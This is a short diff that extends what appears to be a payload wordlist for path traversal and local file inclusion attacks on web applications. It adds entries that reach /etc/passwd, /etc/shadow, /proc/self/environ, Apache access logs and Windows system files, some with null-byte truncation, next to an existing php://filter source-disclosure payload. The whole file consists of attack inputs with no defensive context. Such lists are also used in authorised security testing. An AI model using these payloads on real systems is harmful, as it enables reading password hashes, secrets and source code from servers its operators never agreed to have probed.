@@ -1,3 +1,13 @@
 ../../../../etc/passwd
 ../../../../etc/hosts
 php://filter/convert.base64-encode/resource=index.php
+../../../../etc/passwd
+../../../../proc/self/environ
+../../../../var/log/apache2/access.log
+../../../../windows/win.ini
+../../../../boot.ini
+../../../../etc/hosts
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../proc/self/cmdline
+../../../../../../../../../../var/www/html/index.php
